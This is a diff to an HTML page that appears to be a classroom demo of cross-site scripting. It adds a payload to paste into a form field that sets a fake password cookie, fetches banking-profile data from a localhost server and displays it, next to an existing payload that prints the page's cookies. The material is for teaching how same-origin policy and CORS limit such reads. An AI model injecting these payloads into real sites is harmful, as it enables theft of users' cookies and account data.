@@ -24,9 +24,9 @@
 <!-- Import JavaScript code from http://localhost:9443 -->
 <script src="https://localhost:9443/cors/get-cookie-and-storage.js "></script>
 
-<textarea rows="10" cols="150">
+<textarea rows="40" cols="150">
 
-      use this in first name:
+      #################  Use the following to show how XSS can export data from browser ####################
 
 
       <div id="json-output"> </div>
@@ -43,6 +43,25 @@
                     const jsonOutput = document.getElementById('json-output');
                     jsonOutput.innerHTML += `<pre>${JSON.stringify(json, null, 2)} <br>I got your cookies!!: "  ${document.cookie} </pre>`;
                 });;</script>   
+
+      #################  Use the following to show how SOP and CORs can prevent/allow an XSS to read banking data ####################
+
+
+          <div id="json-output"> </div>
+          <script> 
+          document.cookie = "Password=Abc123!!!";
+          fetch('https://localhost:9443//banking-profile-info')
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(json => {
+                    const jsonOutput = document.getElementById('json-output');
+                    jsonOutput.innerHTML += `<pre>${JSON.stringify(json, null, 2)} <br>I got your Bank Info!!!!: </pre>`;
+                });;</script>   
+
 
 </textarea>
 
